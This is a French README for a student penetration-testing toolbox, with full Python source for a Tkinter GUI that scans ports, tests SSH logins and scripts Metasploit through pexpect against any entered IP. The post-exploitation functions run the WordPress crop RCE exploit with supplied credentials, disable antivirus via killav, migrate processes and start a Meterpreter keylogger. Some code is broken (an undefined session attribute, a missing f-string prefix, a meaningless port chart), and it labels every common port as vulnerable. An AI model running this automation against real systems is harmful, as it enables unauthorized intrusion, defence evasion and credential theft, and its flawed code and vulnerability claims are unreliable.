# Toolbox
Projet d'études de M1 : Toolbox automatiser 

# Toolbox 

 La Toolbox est un outil de test d'intrusion simple et intuitif conçu pour évaluer la sécurité des systèmes d'information. Il offre une interface graphique versatile pour effectuer diverses tâches de sécurité telles que le scan de ports, la détection de vulnérabilités, l'analyse de la sécurité des mots de passe, et bien plus encore.

![image](https://github.com/kevlouis/Toolbox/assets/114162535/c59d28d8-0dcd-4301-a54e-f09522a43daf)

![image](https://github.com/kevlouis/Toolbox/assets/114162535/47fb1295-5178-4b43-84c9-22259d0fa395)

# Schéma d'architecture 

![image](https://github.com/kevlouis/Toolbox/assets/114162535/c29ec000-15b5-434f-b100-4961dc6f10c2)

## Fonctionnalités

### Explorer les ports et les services :

Description : Cette fonctionnalité scanne les ports ouverts de la cible spécifiée et identifie les services associés à ces ports.
Utilisation : Sélectionnez l'option "Explorer les ports et les services" et entrez l'adresse IP de la cible. Le rapport généré listera les ports ouverts et les services associés.

![image](https://github.com/kevlouis/Toolbox/assets/114162535/5bb06994-79a7-40bf-b002-5ae7b6fc0d92)


### Détecter les vulnérabilités :

Description : Cette fonctionnalité analyse les services en cours d'exécution sur la cible pour détecter des vulnérabilités connues.
Utilisation : Sélectionnez l'option "Détecter les vulnérabilités" et entrez l'adresse IP de la cible. Le rapport généré détaillera les vulnérabilités détectées, y compris les versions des services et des suggestions sur la manière dont elles peuvent être exploitées.

![image](https://github.com/kevlouis/Toolbox/assets/114162535/491faa54-6db8-4fdc-beae-18b369e69567)


### Analyser la sécurité des mots de passe :

Description : Cette fonctionnalité évalue la robustesse des mots de passe fournis en analysant leur longueur et leur complexité.
Utilisation : Sélectionnez l'option "Analyser la sécurité des mots de passe" et entrez le mot de passe à analyser. Le rapport généré évaluera la force du mot de passe.

![image](https://github.com/kevlouis/Toolbox/assets/114162535/4bc25ebb-5b41-46bd-a4b1-62af9ec7ab49)


![image](https://github.com/kevlouis/Toolbox/assets/114162535/3fdc8aaf-cb75-4a78-881c-d2c880b8f2b2)


### Exécuter des tests d'authentification :

Description : Cette fonctionnalité vérifie les informations d'identification pour les connexions SSH.
Utilisation : Sélectionnez l'option "Exécuter des tests d'authentification" et entrez l'adresse IP de la cible, le nom d'utilisateur et le mot de passe. Le rapport généré indiquera si l'authentification a réussi.


![image](https://github.com/kevlouis/Toolbox/assets/114162535/b42da4e3-c9e1-46e1-99b5-1ad451eb2e6a)


### Exploiter les vulnérabilités :

Description : Cette fonctionnalité tente d'exploiter les vulnérabilités identifiées pour obtenir un accès non autorisé au système cible.
Utilisation : Sélectionnez l'option "Exploiter les vulnérabilités" et entrez l'adresse IP de la cible. Le rapport généré détaillera les tentatives d'exploitation et leurs résultats.

### Analyse post-exploitation :

Description : Cette fonctionnalité effectue une analyse approfondie après l'exploitation pour identifier les données sensibles et les mesures de sécurité en place.
Utilisation : Sélectionnez l'option "Analyse post-exploitation" et entrez les informations requises. Le rapport généré documentera les actions de post-exploitation effectuées.

### Générer un rapport complet :

Description : Cette fonctionnalité génère un rapport complet incluant toutes les analyses sélectionnées.
Utilisation : Sélectionnez l'option "Générer un rapport complet". Le rapport généré comprendra toutes les analyses effectuées.


![image](https://github.com/kevlouis/Toolbox/assets/114162535/c6daf734-36be-46a9-beb2-e08940a5350c)


## Prérequis

Assurez-vous d'avoir les dépendances suivantes installées :

- Python 3
- tkinter
- nmap
- paramiko
- pexpect
- reportlab
- matplotlib
- pyinstaller (pour créer un exécutable)

Installez les dépendances en utilisant pip :
pip install python-nmap paramiko pexpect reportlab matplotlib pyinstaller.

## Installation

git clone https://github.com/votre_nom_d_utilisateur/Toolbox_IT.git
cd Toolbox_IT

## Exécutez le script pour créer un raccourci sur votre bureau :

sudo python3 create_shortcut.py


![image](https://github.com/kevlouis/Toolbox/assets/114162535/e3e2f1ea-aab2-4893-a1d6-f647a17cbcfa)


## Utilisation 

Exécuter le script pour créer le raccourci

Le script create_shortcut.py s'occupe de créer les répertoires nécessaires, de copier les fichiers, de générer un exécutable et de créer un raccourci sur le bureau. Pour exécuter le script :

sudo python3 create_shortcut.py
Ce que fait le script :
Crée un dossier Toolbox_IT dans votre répertoire personnel.
Copie le fichier python_intrusion_toolbox.py dans ce dossier.
Utilise PyInstaller pour créer un exécutable.
Crée un raccourci sur votre bureau pour lancer l'outil avec une icône générique.
Lancer l'application

Une fois le raccourci créé, double-cliquez sur l'icône "Toolbox IT" sur votre bureau pour lancer l'interface graphique. Vous pouvez ensuite sélectionner les fonctionnalités que vous souhaitez utiliser et suivre les instructions à l'écran.

Fichiers créés
Dossier Toolbox_IT : Créé dans votre répertoire personnel pour stocker les fichiers nécessaires.
Raccourci Toolbox_IT.desktop : Créé sur votre bureau pour lancer l'application.
Ces fichiers sont créés automatiquement par le script create_shortcut.py, vous n'avez donc pas besoin de les créer manuellement.

## Détails des Scripts

create_shortcut.py
Ce script crée un répertoire Toolbox_IT dans le répertoire personnel de l'utilisateur, copie les fichiers nécessaires, et crée un raccourci sur le bureau avec une icône générique. Voici les principales étapes du script :

create_directories : Crée les répertoires nécessaires et copie les fichiers.
create_linux_shortcut : Crée un raccourci sur le bureau avec une icône générique.
main : Gère le processus d'installation et de création du raccourci.
python_intrusion_toolbox.py
Ce script constitue le cœur de la toolbox, fournissant l'interface graphique et les fonctionnalités de test d'intrusion. Voici quelques-unes des principales fonctions :

explore_ports_and_services : Scanne les ports ouverts et identifie les services.
detect_vulnerabilities : Utilise nmap pour détecter les vulnérabilités des services.
analyze_passwords : Évalue la force des mots de passe.
run_authentication_tests : Vérifie les informations d'identification SSH.
exploit_vulnerabilities : Tente d'exploiter les vulnérabilités avec Metasploit.
post_exploitation_analysis : Effectue des actions post-exploitation comme la recherche de fichiers sensibles et la désactivation des antivirus.

## Contributions

Les contributions sont les bienvenues. Veuillez soumettre des pull requests ou ouvrir des issues pour discuter des modifications proposées.

## Licence 

Ce projet est sous licence MIT. Voir le fichier LICENSE pour plus de détails.


### Scripts

create_shortcut.py : C'est le script permettant la création d'un raccourci avec une icone permettant de n'avoir juste qu'à double cliquer pour exécuter le script python au lieu d'ouvrir une invite de commande.
python_intrusion_toolbox.py : C'est le script principal contenant toutes les commandes pour créer la toolbox avec une interface graphique fournir des rapports et éxécuter chaque option.

#### `create_shortcut.py`

```python
import os
import platform
import subprocess
import shutil

def create_directories():
    home_dir = os.path.expanduser('~')
    desktop_dir = os.path.join(home_dir, 'Desktop')
    toolbox_dir = os.path.join(home_dir, 'Toolbox_IT')
    
    if not os.path.exists(toolbox_dir):
        os.makedirs(toolbox_dir)
    
    # Copier les fichiers nécessaires dans le dossier Toolbox_IT
    files_to_copy = ['python_intrusion_toolbox.py']
    for file in files_to_copy:
        shutil.copy(file, toolbox_dir)

    return toolbox_dir, desktop_dir

def create_linux_shortcut(toolbox_dir, desktop_dir):
    target = os.path.join(toolbox_dir, 'python_intrusion_toolbox')
    icon_name = "utilities-terminal"  # Icône par défaut de Linux
    shortcut_name = "Toolbox_IT.desktop"
    
    desktop_entry = f"""
[Desktop Entry]
Version=1.0
Name=Toolbox IT
Exec={target}
Icon={icon_name}
Terminal=false
Type=Application
"""
    shortcut_path = os.path.join(desktop_dir, shortcut_name)
    
    with open(shortcut_path, 'w') as shortcut_file:
        shortcut_file.write(desktop_entry)
    
    os.chmod(shortcut_path, 0o755)
    print(f"Shortcut created at {shortcut_path}")

def main():
    toolbox_dir, desktop_dir = create_directories()
    
    script_path = os.path.abspath(os.path.join(toolbox_dir, "python_intrusion_toolbox.py"))
    subprocess.call(['pyinstaller', '--onefile', '--windowed', script_path])
    exe_path = os.path.join('dist', 'python_intrusion_toolbox')

    # Supprimer le fichier existant si nécessaire
    if os.path.exists(os.path.join(toolbox_dir, 'python_intrusion_toolbox')):
        os.remove(os.path.join(toolbox_dir, 'python_intrusion_toolbox'))

    # Déplacer l'exécutable dans le répertoire Toolbox_IT
    shutil.move(exe_path, toolbox_dir)

    create_linux_shortcut(toolbox_dir, desktop_dir)
    
if __name__ == "__main__":
    main()




#### `python_intrusion_toolbox.py`  Script De la toolbox




import tkinter as tk
from tkinter import messagebox, simpledialog
import socket
import os
import subprocess
from reportlab.lib.pagesizes import A4
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, Image as ReportLabImage
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib import colors
from datetime import datetime
import paramiko
import nmap
import sys
import platform
import pexpect
import re
import matplotlib
matplotlib.use('Agg')
import matplotlib.pyplot as plt

PORTS_IANA_INFO = {
    21: "FTP",
    22: "SSH",
    23: "Telnet",
    25: "SMTP",
    53: "DNS",
    80: "HTTP",
    110: "POP3",
    443: "HTTPS",
    3389: "RDP"
}

COLOR_SCHEMES = {
    "Explorer les ports et les services": colors.lightblue,
    "Détecter les vulnérabilités": colors.lightgreen,
    "Analyser la sécurité des mots de passe": colors.lightcoral,
    "Exécuter des tests d'authentification": colors.lightgoldenrodyellow,
    "Exploiter les vulnérabilités": colors.lightpink,
    "Analyse post-exploitation": colors.lightgrey
}

class BoiteOutilsGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Boîte à outils de test d'intrusion")
        self.root.geometry("600x700")
        self.root.configure(bg="#2c3e50")
        self.report_data = []

        self.title_label = tk.Label(self.root, text="TOOLBOX", font=("Helvetica", 24, "bold"), bg="#2c3e50", fg="white")
        self.title_label.pack(pady=20)

        self.options_frame = tk.Frame(self.root, bg="#2c3e50")
        self.options_frame.pack(padx=20, pady=20)

        self.check_vars = [tk.IntVar() for _ in range(7)]
        self.check_buttons = []
        for i, text in enumerate(["Explorer les ports et les services",
                                                                    "Détecter les vulnérabilités",
                                  "Analyser la sécurité des mots de passe",
                                  "Exécuter des tests d'authentification",
                                  "Exploitation de vulnérabilités",
                                  "Analyse post-exploitation",
                                  "Générer un rapport complet"]):
            check_button = tk.Checkbutton(self.options_frame, text=text, variable=self.check_vars[i], bg="#2c3e50", fg="white", font=("Helvetica", 12), selectcolor="#3498db")
            check_button.pack(anchor="w", pady=5)
            self.check_buttons.append(check_button)

        self.start_button = tk.Button(self.root, text="Démarrer", command=self.start, bg="#3498db", fg="white", font=("Helvetica", 12, "bold"))
        self.start_button.pack(pady=20)

        self.result_label = tk.Label(self.root, text="", bg="#2c3e50", fg="yellow", font=("Helvetica", 12))
        self.result_label.pack(pady=20)

        self.company_label = tk.Label(self.root, text="LOUIS-IT", bg="#2c3e50", fg="white", font=("Helvetica", 14, "italic"))
        self.company_label.pack(side="bottom", pady=20)

        self.show_custom_welcome_message()

    def show_custom_welcome_message(self):
        welcome_window = tk.Toplevel(self.root)
        welcome_window.title("Bienvenue")
        welcome_window.geometry("500x300")
        welcome_window.configure(bg="#1e1e1e")

        welcome_label = tk.Label(welcome_window, text="Bonjour Monsieur ou Madame,\n\nLa Société LOUIS-IT met à votre disposition cette toolbox pour tester votre système d'information.", bg="#1e1e1e", fg="#f39c12", font=("Helvetica", 14, "bold"))
        welcome_label.pack(padx=20, pady=50)

        close_button = tk.Button(welcome_window, text="Fermer", command=welcome_window.destroy, bg="#e74c3c", fg="white", font=("Helvetica", 12, "bold"))
        close_button.pack(pady=10)

    def start(self):
        selected_options = [i+1 for i, var in enumerate(self.check_vars) if var.get() == 1]
        if not selected_options:
            messagebox.showwarning("Aucune fonctionnalité sélectionnée", "Veuillez sélectionner au moins une fonctionnalité.")
            return
        
        for option in selected_options:
            if option == 1:  # Explorer les ports et les services
                self.explore_ports_and_services()
            elif option == 2:  # Détecter les vulnérabilités
                self.detect_vulnerabilities()
            elif option == 3:  # Analyser la sécurité des mots de passe
                self.analyze_passwords()
            elif option == 4:  # Exécuter des tests d'authentification
                self.run_authentication_tests()
            elif option == 5:  # Exploitation de vulnérabilités
                self.exploit_vulnerabilities()
            elif option == 6:  # Analyse post-exploitation
                self.post_exploitation_analysis()
            elif option == 7:  # Générer un rapport complet
                self.generate_report(selected_options, complete=True)

    def explore_ports_and_services(self):
        target = simpledialog.askstring("Adresse IP de la cible", "Entrez l'adresse IP de la cible : ")
        if target:
            ports_status = self.scan_ports(target)
            self.generate_report_entry("Explorer les ports et les services", ports_status, target)
            self.generate_report(["Explorer les ports et les services"], complete=False)

    def scan_ports(self, target):
        ports_status = {}
        for port in range(1, 1025):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex((target, port))
            if result == 0:
                ports_status[port] = "Open"
            else:
                ports_status[port] = "Closed"
            sock.close()
        return ports_status

    def detect_vulnerabilities(self):
        nm = nmap.PortScanner()
        target = simpledialog.askstring("Adresse IP de la cible", "Entrez l'adresse IP de la cible : ")
        if target:
            try:
                nm.scan(target, arguments='-sV')
                vulnerabilities = {}
                for host in nm.all_hosts():
                    if 'tcp' in nm[host]:
                        for port in nm[host]['tcp']:
                            state = nm[host]['tcp'][port]['state']
                            service = nm[host]['tcp'][port]['name']
                            version = nm[host]['tcp'][port].get('version', 'N/A')
                            vulnerabilities[port] = {
                                'state': state,
                                'service': service,
                                'version': version,
                                'vulnerable': self.check_port_vulnerability(port)
                            }
                self.generate_report_entry("Détecter les vulnérabilités", vulnerabilities, target)
                self.generate_report(["Détecter les vulnérabilités"], complete=False)
            except nmap.PortScannerError as e:
                messagebox.showerror("Erreur Nmap", f"Erreur lors du scan Nmap : {e}")
            except Exception as e:
                messagebox.showerror("Erreur inconnue", f"Erreur inconnue : {e}")

    def check_port_vulnerability(self, port):
        if port in PORTS_IANA_INFO:
            return f"Port {port} ({PORTS_IANA_INFO[port]}) a une vulnérabilité connue. Vous pouvez essayer d'exploiter cette vulnérabilité avec Metasploit ou un autre outil d'exploitation."
        return "Pas de vulnérabilité connue pour ce port."

    def analyze_passwords(self):
        password = simpledialog.askstring("Analyse de mot de passe", "Entrez le mot de passe à analyser : ", show='*')
        if password:
            strength = self.evaluate_password_strength(password)
            self.generate_report_entry("Analyser la sécurité des mots de passe", {"password": password, "strength": strength}, "N/A")
            self.generate_report(["Analyser la sécurité des mots de passe"], complete=False)
            messagebox.showinfo("Force du mot de passe", f"La force du mot de passe est : {strength}")

    def evaluate_password_strength(self, password):
        length = len(password)
        if length < 6:
            return "Faible"
        if length < 10:
            return "Moyen"
        if re.search(r"[A-Z]", password) and re.search(r"[a-z]", password) and re.search(r"[0-9]", password) and re.search(r"[^A-Za-z0-9]", password):
            return "Fort"
        return "Moyen"

    def run_authentication_tests(self):
        target = simpledialog.askstring("Adresse IP de la cible", "Entrez l'adresse IP de la cible : ")
        if target:
            self.username = simpledialog.askstring("Nom d'utilisateur", "Entrez le nom d'utilisateur : ")
            self.password = simpledialog.askstring("Mot de passe", "Entrez le mot de passe : ", show='*')
            if self.username and self.password:
                success = self.authenticate(target, self.username, self.password)
                self.generate_report_entry("Exécuter des tests d'authentification", {"username": self.username, "success": success}, target)
                self.generate_report(["Exécuter des tests d'authentification"], complete=False)
                messagebox.showinfo("Résultat de l'authentification", "Authentification réussie." if success else "Échec de l'authentification.")

    def authenticate(self, target, username, password):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(target, username=username, password=password)
            ssh.close()
            return True
        except paramiko.AuthenticationException:
            return False

    def exploit_vulnerabilities(self):
        target = simpledialog.askstring("Adresse IP de la cible", "Entrez l'adresse IP de la cible : ")
        if target:
            self.run_metasploit_exploit(target)
            self.generate_report_entry("Exploiter les vulnérabilités", {"target": target}, target)
            self.generate_report(["Exploiter les vulnérabilités"], complete=False)

    def run_metasploit_exploit(self, target):
        child = pexpect.spawn('msfconsole', ['-q'], timeout=300)
        child.logfile = sys.stdout.buffer
        child.expect('msf6 >', timeout=300)
        child.sendline('use exploit/multi/http/wp_crop_rce')
        child.expect('msf6 exploit(multi/http/wp_crop_rce) >', timeout=300)
        child.sendline(f'set RHOSTS {target}')
        child.expect('RHOSTS =>', timeout=300)
        child.sendline(f'set USERNAME {self.username}')
        child.expect('USERNAME =>', timeout=300)
        child.sendline(f'set PASSWORD {self.password}')
        child.expect('PASSWORD =>', timeout=300)
        child.sendline('exploit')
        child.expect('msf6 exploit(multi/http/wp_crop_rce) >', timeout=300)
        print(child.before.decode('utf-8'))
        child.sendline('exit')
        child.close()

    def post_exploitation_analysis(self):
        session = simpledialog.askstring("Session Meterpreter", "Entrez le numéro de session Meterpreter : ")
        if session:
            self.disable_antivirus(session)
            self.search_interesting_files()
            pid = simpledialog.askstring("PID de migration", "Entrez le PID du processus de migration : ")
            if pid:
                self.migrate_process(pid)
                self.keylogging()
                self.generate_report_entry("Analyse post-exploitation", {"session": session, "pid": pid}, session)
                self.generate_report(["Analyse post-exploitation"], complete=False)

    def disable_antivirus(self, session):
        result = subprocess.run(["msfconsole", "-q", "-x", f"use post/windows/manage/killav; set SESSION {session}; exploit"], capture_output=True, text=True)
        print(result.stdout)

    def search_interesting_files(self):
        result = subprocess.run(["msfconsole", "-q", "-x", "use post/multi/gather/search; search -f *.pdf"], capture_output=True, text=True)
        print(result.stdout)

    def migrate_process(self, pid):
        result = subprocess.run(["msfconsole", "-q", "-x", f"session -i {self.session}; migrate {pid}"], capture_output=True, text=True)
        print(result.stdout)

    def keylogging(self):
        result = subprocess.run(["msfconsole", "-q", "-x", "session -i {self.session}; keyscan_start"], capture_output=True, text=True)
        print(result.stdout)

    def generate_report_entry(self, title, data, target):
        self.report_data.append((title, data, target))

    def generate_report(self, selected_options, complete=False):
        if complete:
            report_filename = f"rapport_complet_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.pdf"
        else:
            report_filename = f"rapport_option_{selected_options[0]}_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.pdf"

        doc = SimpleDocTemplate(report_filename, pagesize=A4)
        styles = getSampleStyleSheet()
        styles.add(ParagraphStyle(name='Justify', alignment=4))
        report_content = []

        # Couverture du rapport
        report_content.append(Paragraph("Rapport de Sécurité", styles["Title"]))
        report_content.append(Paragraph(f"Date et heure du test : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", styles["Normal"]))
        report_content.append(Spacer(1, 12))

        for title, data, target in self.report_data:
            intro_text = self.get_report_intro(title)
            report_content.append(Paragraph(intro_text, styles["Normal"]))
            report_content.append(Spacer(1, 12))

            color = COLOR_SCHEMES.get(title, colors.white)
            report_content.append(Spacer(1, 12))

            report_content.append(Paragraph(f"--- {title} ---", ParagraphStyle(name="ColoredHeading", fontSize=14, textColor=colors.black, backColor=color, spaceAfter=12)))
            report_content.append(Paragraph(f"Adresse IP de la cible : {target}", styles["Normal"]))
            report_content.append(Spacer(1, 12))

            if title == "Explorer les ports et les services":
                table_data = [["Port", "Statut", "Service"]]
                for port, status in data.items():
                    service = PORTS_IANA_INFO.get(port, "Inconnu")
                    table_data.append([port, status, service])
                table = Table(table_data, colWidths=[100, 100, 300])
                table.setStyle(TableStyle([('BACKGROUND', (0, 0), (-1, 0), colors.lightblue),
                                           ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
                                           ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
                                           ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
                                           ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
                                           ('BACKGROUND', (0, 1), (-1, -1), colors.beige),
                                           ('GRID', (0, 0), (-1, -1), 1, colors.black)]))
                report_content.append(table)
            elif title == "Détecter les vulnérabilités":
                table_data = [["Port", "Service", "Version", "Vulnérable"]]
                for port, details in data.items():
                    table_data.append([port, details['service'], details['version'], details['vulnerable']])
                table = Table(table_data, colWidths=[100, 100, 200, 200])
                table.setStyle(TableStyle([('BACKGROUND', (0, 0), (-1, 0), colors.lightgreen),
                                           ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
                                           ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
                                           ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
                                           ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
                                           ('BACKGROUND', (0, 1), (-1, -1), colors.beige),
                                           ('GRID', (0, 0), (-1, -1), 1, colors.black)]))
                report_content.append(table)
            elif title == "Analyser la sécurité des mots de passe":
                line = f"Mot de passe : {'*' * len(data['password'])} - Force : {data['strength']}"
                report_content.append(Paragraph(line, styles["Normal"]))
            elif title == "Exécuter des tests d'authentification":
                line = f"Nom d'utilisateur : {data['username']} - Succès : {'Oui' if data['success'] else 'Non'}"
                report_content.append(Paragraph(line, styles["Normal"]))
            elif title == "Exploiter les vulnérabilités":
                line = f"Cible : {data['target']}"
                report_content.append(Paragraph(line, styles["Normal"]))
            elif title == "Analyse post-exploitation":
                line = f"Session : {data['session']} - PID : {data['pid']}"
                report_content.append(Paragraph(line, styles["Normal"]))

            report_content.append(Spacer(1, 12))

        self.add_graphs_to_report(report_content)

        doc.build(report_content)
        print(f"Rapport généré : {report_filename}")

    def get_report_intro(self, title):
        intros = {
            "Explorer les ports et les services": (
                "Ce rapport présente les résultats de l'exploration des ports et des services "
                "pour la cible spécifiée. Il identifie les ports ouverts ainsi que les services "
                "qui y sont associés. Cette étape est cruciale pour comprendre la surface d'attaque "
                "disponible sur le système cible."
            ),
            "Détecter les vulnérabilités": (
                "Ce rapport détaille les vulnérabilités détectées sur les services en cours d'exécution "
                "sur la cible. En identifiant les versions des services et en recherchant des vulnérabilités connues, "
                "ce rapport aide à évaluer les risques potentiels auxquels le système est exposé. Il inclut également des "
                "suggestions sur la manière dont ces vulnérabilités peuvent être exploitées."
            ),
            "Analyser la sécurité des mots de passe": (
                "Ce rapport évalue la robustesse du mot de passe fourni en analysant sa longueur, "
                "sa complexité et d'autres critères de sécurité. Cette analyse est essentielle pour assurer "
                "que les mots de passe utilisés sont suffisamment sécurisés pour protéger les ressources critiques."
            ),
            "Exécuter des tests d'authentification": (
                "Ce rapport présente les résultats des tests d'authentification réalisés avec les informations "
                "d'identification fournies. En testant la validité des noms d'utilisateur et des mots de passe, "
                "il est possible de vérifier la robustesse des mécanismes d'authentification du système cible."
            ),
            "Exploiter les vulnérabilités": (
                "Ce rapport décrit les tentatives d'exploitation des vulnérabilités détectées sur la cible. "
                "En utilisant des outils d'exploitation comme Metasploit, ce rapport montre les potentiels accès non autorisés "
                "qui peuvent être obtenus et les actions pouvant être entreprises suite à ces accès."
            ),
            "Analyse post-exploitation": (
                "Ce rapport documente les actions de post-exploitation effectuées après avoir obtenu un accès initial à la cible. "
                "Il comprend des activités telles que la recherche de fichiers sensibles, la désactivation des antivirus et la "
                "migration des processus. Ces étapes permettent de comprendre l'impact d'une intrusion réussie."
            )
        }
        return intros.get(title, "")

    def add_graphs_to_report(self, report_content):
        plt.figure(figsize=(6, 4))
        ports = list(PORTS_IANA_INFO.keys())
        statuses = ["Open", "Closed"]
        counts = [sum(1 for port in ports if PORTS_IANA_INFO[port] == status) for status in statuses]

        plt.bar(statuses, counts, color=['green', 'red'])
        plt.xlabel('Statut')
        plt.ylabel('Nombre de ports')
        plt.title('Statut des ports')
        graph_filename = 'graph_ports_status.png'
        plt.savefig(graph_filename)
        plt.close()
        report_content.append(ReportLabImage(graph_filename))

def main():
    root = tk.Tk()
    app = BoiteOutilsGUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()





